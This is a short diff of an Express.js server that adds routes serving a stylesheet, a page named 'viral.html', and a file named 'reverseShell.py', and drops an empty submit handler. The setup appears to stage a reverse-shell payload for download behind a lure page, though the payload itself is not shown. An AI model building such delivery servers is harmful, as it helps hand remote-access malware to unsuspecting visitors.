@@ -58,7 +58,16 @@ app.get("/", (req, res) => {
   res.sendFile("/pages/index.html");
 });
 
-app.post("/submit", (req, res) => {
-  
+app.get("/style.css", (req, res) => {
+  res.sendFile("/style.css");
+});
+
+app.get("/viral", (req, res) => {
+  res.sendFile("/pages/viral.html");
+});
+
+app.get("/reverseShell.py", (req, res) => {
+  res.send(fs.readFileSync("/reverseShell.py"));
+});
 
 app.listen(process.env.PORT, () => { console.log(`Server running at http://localhost:${process.env.PORT}.`) });
